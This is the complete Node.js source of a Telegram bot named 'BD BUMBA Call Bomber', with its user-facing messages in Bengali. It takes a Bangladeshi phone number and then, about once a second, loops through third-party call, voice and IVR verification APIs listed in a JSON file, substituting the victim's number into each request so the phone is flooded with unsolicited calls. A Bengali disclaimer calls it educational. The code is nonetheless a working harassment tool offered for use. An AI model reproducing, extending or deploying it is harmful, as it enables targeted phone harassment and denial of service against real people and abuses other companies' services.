require('dotenv').config();
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const TelegramBot = require('node-telegram-bot-api');

const TOKEN = process.env.BOT_TOKEN;
if (!TOKEN) {
  console.error('[boot] BOT_TOKEN missing.');
  process.exit(1);
}

const bot = new TelegramBot(TOKEN, { polling: true });
const sessions = new Map();
let CALL_APIS = [];

// Load the APIs and filter ONLY the Call endpoints
try {
  const rawData = fs.readFileSync(path.join(__dirname, 'apis.json'), 'utf8');
  const allApis = JSON.parse(rawData).apis || [];
  
  // Filter: Keep only URLs that contain "call" or "voice" or "ivr"
  CALL_APIS = allApis.filter(api => 
    api.url.includes('/call/') || 
    api.url.includes('voice') || 
    api.url.includes('ivr') ||
    api.name.toLowerCase().includes('call')
  );
  
  if (CALL_APIS.length === 0) {
      console.log('[boot] No specific call APIs found. Using all APIs.');
      CALL_APIS = allApis;
  } else {
      console.log(`[boot] Loaded ${CALL_APIS.length} CALL APIs from JSON.`);
  }
  
} catch (e) {
  console.error('[boot] apis.json not found or invalid format.');
  process.exit(1);
}

const WARNING = 
  "⚠️ *সতর্কতা (Call Bomber)*\n\n" +
  "যদি কেউ এই বটটি খারাপ উদ্দেশ্যে ব্যবহার করে, আমাদের দল দায়ী থাকবে না। " +
  "এটি শুধুমাত্র শিক্ষামূলক এবং টেস্টিং উদ্দেশ্যে তৈরি করা হয়েছে।\n\n" +
  "আপনার টার্গেট নাম্বারটি দিন (উদাহরণ: 01712345678):";

async function startBombing(targetPhone, chatId, messageId, session) {
  let successCount = 0;
  let failCount = 0;
  let isRunning = true;
  
  session.stopBomb = () => { isRunning = false; };

  const updateProgress = async () => {
    try {
      await bot.editMessageText(
        `📞 *Call Bombing চলছে...*\n\n` +
        `📱 টার্গেট: ${targetPhone}\n` +
        `✅ সফল: ${successCount}\n` +
        `❌ ব্যর্থ: ${failCount}\n` +
        `⏱️ গতি: ১ কল / সেকেন্ড\n\n` +
        `_বন্ধ করতে নিচের বাটনে ক্লিক করুন..._`,
        { 
          chat_id: chatId, 
          message_id: messageId, 
          parse_mode: 'Markdown',
          reply_markup: {
            inline_markup: {
              inline_keyboard: [[{ text: '🛑 বোম্বিং বন্ধ করুন (STOP)', callback_data: 'stop_bomb' }]]
            }
          }
        }
      );
    } catch (e) {} 
  };

  await updateProgress();

  let apiIndex = 0;
  while (isRunning) {
    if (apiIndex >= CALL_APIS.length) {
      apiIndex = 0; 
    }

    const api = CALL_APIS[apiIndex];
    
    (async () => {
      try {
        let url = api.url.replace(/\*{5}/g, targetPhone).replace(/\{phone\}/g, targetPhone);
        let body = api.body ? api.body.replace(/\*{5}/g, targetPhone).replace(/\{phone\}/g, targetPhone) : "";
        let headers = api.headers || {};
        
        if (headers['content-length']) delete headers['content-length'];

        const options = {
          method: api.method.toLowerCase(),
          url: url,
          headers: headers,
          timeout: 4000 
        };
        
        if (api.method.toLowerCase() === "post") {
            if (headers['content-type'] && headers['content-type'].includes('application/json')) {
                try { options.data = JSON.parse(body); } catch (e) { options.data = body; }
            } else {
                options.data = body;
            }
        }

        await axios(options);
        successCount++;
      } catch (error) {
        failCount++;
      }
    })();

    apiIndex++;
    await new Promise(r => setTimeout(r, 1000)); 

    if ((successCount + failCount) % 5 === 0) {
      await updateProgress();
    }
  }

  await bot.editMessageText(
    `✅ *Call Bombing বন্ধ হয়েছে!*\n\n` +
    `📱 টার্গেট: ${targetPhone}\n` +
    `✅ মোট সফল: ${successCount}\n` +
    `❌ মোট ব্যর্থ: ${failCount}\n\n` +
    `_BD BUMBA ইঞ্জিন বন্ধ করা হয়েছে।_`,
    { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' }
  );
}

bot.onText(/^\/start$/, async (msg) => {
  const chatId = msg.chat.id;
  sessions.set(chatId, { step: 'await_number' });
  bot.sendMessage(chatId, WARNING, { parse_mode: 'Markdown' });
});

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const text = (msg.text || '').trim();
  if (text.startsWith('/')) return;

  const session = sessions.get(chatId);
  if (!session || session.step !== 'await_number') return;

  if (!/^01\d{9}$/.test(text)) {
    return bot.sendMessage(chatId, '❌ ভুল নাম্বার। ১১ ডিজিটের নাম্বার দিন (উদাহরণ: 01712345678)।');
  }

  session.phone = text;
  session.step = 'ready';
  sessions.set(chatId, session);

  bot.sendMessage(chatId, `✅ নাম্বার সেট হয়েছে: *${text}*\n\nনিচের বাটনে ক্লিক করে Call Bombing শুরু করুন:`, {
    parse_mode: 'Markdown',
    reply_markup: {
      inline_keyboard: [[{ text: '📞 Call Bombing শুরু করুন (Start)', callback_data: 'start_bomb' }]]
    }
  });
});

bot.on('callback_query', async (q) => {
  const chatId = q.message.chat.id;
  const data = q.data;
  const session = sessions.get(chatId);

  if (data === 'start_bomb' && session && session.phone) {
    await bot.answerCallbackQuery(q.id, { text: 'Call Bombing চালু হচ্ছে...' });
    
    const progressMsg = await bot.sendMessage(
      chatId, 
      `📞 *ইঞ্জিন চালু হচ্ছে...*`,
      { parse_mode: 'Markdown' }
    );

    startBombing(session.phone, chatId, progressMsg.message_id, session);
  }

  if (data === 'stop_bomb' && session) {
    await bot.answerCallbackQuery(q.id, { text: 'বন্ধ করা হচ্ছে...' });
    if (session.stopBomb) {
      session.stopBomb();
    }
  }
});

bot.on('polling_error', (e) => console.error('[polling]', e.message));
console.log(`[boot] BD BUMBA Call Bomber Online. Ready.`);
